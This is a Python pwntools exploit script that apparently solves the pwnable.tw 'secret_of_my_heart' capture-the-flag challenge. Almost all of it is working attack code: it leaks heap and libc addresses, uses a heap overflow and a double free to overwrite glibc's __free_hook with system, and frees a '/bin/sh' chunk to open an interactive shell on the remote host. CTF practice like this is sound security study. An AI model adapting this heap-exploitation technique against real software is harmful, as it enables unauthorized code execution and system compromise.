#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10302
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./secret_of_my_heart_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # malloc
            brva 0x0000000000000D6F
            brva 0x0000000000000DB3

            # free
            brva 0x00000000000010F5
            brva 0x0000000000000E20

            # show
            brva 0x0000000000000F7E
            brva 0x0000000000001022
            brva 0x0000000000001057

            # exit
            brva 0x00000000000011FE
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, name = b'a', data = b'a'):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'heart : ', str(size))
    p.sendafter(b'heart :', name)
    p.sendafter(b'heart :', data)

def show(idx):
    p.sendafter(b'choice :', str(2))
    p.sendafter(b'Index :', str(idx))

def free(idx):
    p.sendafter(b'choice :', str(3))
    p.sendafter(b'Index :', str(idx))

# VARIABLE


# PAYLOAD
add(0x20, b'a'*0x20, b'a'*0x20) # 0
show(0)
p.recvuntil(b'a'*0x20)
heap_leak = u64(p.recv(6) + b'\0'*2)
heap_base = heap_leak - 0x10
log.info("Heap base: " + hex(heap_base))

add(0xf8)                               # 1
add(0xf8)                               # 2
add(0x68)                               # 3
add(0x18)                               # 4

free(1)
add(0x98)                               # 1
add(0x30)                               # 5
free(1)
add(0x18, b'a', b'a'*0x10 + p64(0x100)) # 1
free(2)
add(0x98)                               # 2
show(5)
p.recvuntil(b'Secret : ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x3c3b78
log.info("Libc base: " + hex(libc.address))
free_hook = libc.sym.__free_hook
system = libc.sym.system

payload = b'a'*0x38 + p64(0x71) + p64(free_hook - 8 + 5 - 0x10)
add(0x68, b'a', payload)                # 6
free(6)
free(3)
free(5) # Double Free
add(0x68, b'a', p64(heap_base + 0x110)) # 5
add(0x68)                               # 3
add(0x68)                               # 6
payload = b'/bin/sh'.ljust(0x28, b'\0') + p64(0x31) + p64(0) + p64(free_hook - 0x20)
add(0x68, b'a', payload)                # 7
add(0x28)                               # 8
add(0x68, b'a', b'a'*3 + p64(system))   # 9

free(1)

p.interactive()